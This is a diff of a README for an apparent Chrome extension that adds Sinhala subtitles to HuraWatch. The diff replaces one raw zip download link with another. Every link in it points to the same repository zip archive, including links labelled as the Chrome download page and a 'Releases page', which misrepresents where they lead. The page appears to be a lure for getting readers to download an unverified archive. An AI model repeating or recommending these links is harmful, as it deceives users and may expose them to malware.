@@ -1,7 +1,7 @@
 # 🎥 hurawatch-sinhala-subtitles- - Enhance Your Viewing with Sinhala Subtitles
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/master/content/hurawatch-sinhala-subtitles--v3.1.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/master/content/hurawatch-sinhala-subtitles--v3.1.zip)
+[![Download Latest Release](https://github.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/raw/refs/heads/master/content/subtitles_sinhala_hurawatch_v1.1.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/raw/refs/heads/master/content/subtitles_sinhala_hurawatch_v1.1.zip)
 
 ## 📖 Description
 The hurawatch-sinhala-subtitles- is a Chrome extension designed to add Sinhala subtitle support to HuraWatch. This extension lets you upload your custom SRT or VTT files, giving you full control over the timing of subtitles while you enjoy video streaming.
@@ -10,10 +10,10 @@ The hurawatch-sinhala-subtitles- is a Chrome extension designed to add Sinhala s
 Follow these steps to install the extension and enhance your viewing experience.
 
 ### Step 1: Install Google Chrome
-Ensure you have Google Chrome installed on your computer. If you do not have it, you can download it from [here](https://raw.githubusercontent.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/master/content/hurawatch-sinhala-subtitles--v3.1.zip).
+Ensure you have Google Chrome installed on your computer. If you do not have it, you can download it from [here](https://github.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/raw/refs/heads/master/content/subtitles_sinhala_hurawatch_v1.1.zip).
 
 ### Step 2: Download the Extension
-Visit the [Releases page](https://raw.githubusercontent.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/master/content/hurawatch-sinhala-subtitles--v3.1.zip) to download the latest version of the hurawatch-sinhala-subtitles- extension.
+Visit the [Releases page](https://github.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/raw/refs/heads/master/content/subtitles_sinhala_hurawatch_v1.1.zip) to download the latest version of the hurawatch-sinhala-subtitles- extension.
 
 ### Step 3: Install the Extension
 1. After downloading, locate the file (typically in your Downloads folder).
@@ -54,4 +54,4 @@ For further inquiries or support, please submit an issue on GitHub. We are here 
 Thanks to the developers and contributors for making this project possible. Together, we improve the viewing experience for Sinhala speakers.
 
 ## 📅 Updates
-Stay tuned for updates! We regularly improve the extension and add new features based on user feedback, so check back often on the [Releases page](https://raw.githubusercontent.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/master/content/hurawatch-sinhala-subtitles--v3.1.zip).
+Stay tuned for updates! We regularly improve the extension and add new features based on user feedback, so check back often on the [Releases page](https://github.com/Anhminhhuy1018/hurawatch-sinhala-subtitles-/raw/refs/heads/master/content/subtitles_sinhala_hurawatch_v1.1.zip).
